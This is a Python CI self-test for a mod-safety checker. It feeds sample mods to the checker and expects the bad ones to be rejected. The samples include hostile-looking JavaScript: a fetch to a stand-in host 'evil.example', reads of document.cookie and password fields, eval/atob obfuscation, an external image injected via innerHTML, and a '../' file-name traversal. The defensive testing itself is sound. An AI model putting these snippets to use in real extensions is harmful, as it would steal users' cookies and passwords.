#!/usr/bin/env python3
"""Самопроверка: плохие моды должны отклоняться, хорошие — проходить. Запускается в CI."""
import json
import sys
import tempfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
import check_mods as cm  # noqa: E402

BASE = {
    "id": "t-mod", "name": "T", "author": "a", "version": "1.0", "description": "d",
    "matches": ["jut.su"], "js": "script.js", "permissions": [], "api": [],
}


def run(code, css="", **over):
    extra = over.pop("_extra", {})
    with tempfile.TemporaryDirectory() as tmp:
        d = Path(tmp) / "t-mod"
        d.mkdir()
        m = dict(BASE)
        m.update(over)
        if css:
            m["css"] = "style.css"
            (d / "style.css").write_text(css, encoding="utf-8")
        (d / "manifest.json").write_text(json.dumps(m), encoding="utf-8")
        (d / "script.js").write_text(code, encoding="utf-8")
        for name, content in extra.items():
            (d / name).write_text(content)
        entry, errors, _ = cm.check_mod(d)
        return entry, errors


CASES = [
    # (описание, js, ожидаем_отказ, доп. поля манифеста)
    ("пустой безопасный", "animebuffer.log('hi');", False, {"api": ["log"]}),
    ("fetch без заявки", "fetch('https://evil.example/?c=1');", True, {}),
    ("fetch с заявкой проходит (куратор решает)", "fetch('https://x.example/a');", False, {"permissions": ["network"]}),
    ("cookie без заявки", "var c = document.cookie;", True, {"permissions": ["dom"]}),
    ("eval", "eval('1+1');", True, {}),
    ("new Function", "new Function('return 1')();", True, {}),
    ("atob", "var s = atob('YWxlcnQoMSk=');", True, {}),
    ("fromCharCode", "var s = String.fromCharCode(97, 98);", True, {}),
    ("window['fe'+'tch']", "window['fe' + 'tch']('x');", True, {}),
    ("globalThis[имя]", "globalThis[name]('x');", True, {}),
    (".constructor", "[].constructor.constructor('return 1')();", True, {}),
    ("setTimeout строкой", "setTimeout('alert(1)', 10);", True, {}),
    ("hex-цепочка", "var s = '\\x61\\x62\\x63\\x64';", True, {}),
    ("минификация (длинная строка)", "var a=1;" * 200, True, {}),
    ("animebuffer как значение", "var a = animebuffer; a.log(1);", True, {}),
    ("неизвестный метод API", "animebuffer.steal();", True, {}),
    ("api не заявлен", "animebuffer.log('x');", True, {}),
    ("img src через innerHTML", "document.body.innerHTML = '<img src=\"https://e.example/\">';", True, {"permissions": ["dom"]}),
    ("пароли без заявки", "var p = document.querySelector('input[type=password]');", True, {"permissions": ["dom"]}),
    ("postMessage", "top.postMessage('x', '*');", True, {}),
    ("лишний файл", "animebuffer.log(1);", True, {"api": ["log"], "_extra": {"payload.js": "x"}}),
    ("плохое имя файла", "animebuffer.log(1);", True, {"api": ["log"], "js": "../x.js"}),
    ("слишком много сайтов", "animebuffer.log(1);", True, {"api": ["log"], "matches": ["a%d.example" % i for i in range(31)]}),
    ("matches пустой", "animebuffer.log(1);", True, {"api": ["log"], "matches": []}),
    ("хороший мод со storage/dom", "var k = animebuffer.storage.get('a', 1); document.title;", False,
     {"api": ["storage"], "permissions": ["storage", "dom"]}),
]


def main():
    bad = 0
    for title, js, should_fail, over in CASES:
        # доп. файлы кладём прямо в manifest-аргумент _extra
        entry, errors = run(js, **over)
        failed = bool(errors)
        status = "ok " if failed == should_fail else "BAD"
        if failed != should_fail:
            bad += 1
        print("[%s] %s%s" % (status, title, "" if not errors else "  <- " + errors[0]))
    # CSS: внешний url
    entry, errors = run("animebuffer.log(1);", css="a{background:url(https://e.example/p.png)}", api=["log"], permissions=["style"])
    print("[%s] css с внешним url без заявки network" % ("ok " if errors else "BAD"))
    bad += 0 if errors else 1
    print("\nПровалено проверок: %d" % bad)
    return 1 if bad else 0


if __name__ == "__main__":
    sys.exit(main())
